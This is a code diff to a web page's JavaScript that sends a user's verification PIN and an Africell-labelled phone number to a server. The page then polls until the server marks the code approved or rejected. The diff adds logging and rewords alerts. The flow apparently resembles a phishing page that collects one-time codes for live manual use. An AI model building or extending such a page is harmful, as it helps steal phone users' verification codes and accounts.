@@ -289,6 +289,7 @@
     </div>
 
     <script>
+
         function showAppAlert(message) {
             document.getElementById('modalText').innerText = message;
             document.getElementById('customModal').style.display = 'flex';
@@ -302,10 +303,10 @@
             const pinVal = document.getElementById('verificationPin').value.trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
-            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Unknown User';
+            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
 
             if (!pinVal || pinVal.length < 4) {
-                showAppAlert('❌ Wrong Code');
+                showAppAlert('❌ Please enter a valid PIN code.');
                 return;
             }
 
@@ -315,6 +316,7 @@
                 verifyBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
+                console.log("Sending SMS verification code to server...");
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -322,13 +324,14 @@
                 });
 
                 const result = await response.json();
+                console.log("Server submission response:", result);
 
                 if (result.success) {
                     pollApprovalStatus(phoneInput);
                 } else {
                     verifyBtn.classList.remove('disabled-state');
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    showAppAlert('❌ Wrong Code');
+                    showAppAlert('❌ Verification failed. Please try again.');
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -343,20 +346,25 @@
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
 
+            console.log("Starting polling loop for phone:", cleanPhone);
+
             const statusInterval = setInterval(async () => {
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
+                    console.log("Current approval status check:", data.status);
+
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
+                        console.log("Approved! Redirecting to new.html...");
                         window.location.href = 'new.html';
                     } 
                     else if (data.status === 'rejected' || data.status === 'wrong_id') {
                         clearInterval(statusInterval);
                         if (spinnerDiv) spinnerDiv.style.display = 'none';
                         verifyBtn.classList.remove('disabled-state');
-                        showAppAlert('❌ Wrong Code');
+                        showAppAlert('❌ Wrong Code / Rejected');
                     }
                 } catch (e) {
                     console.error('Polling error', e);
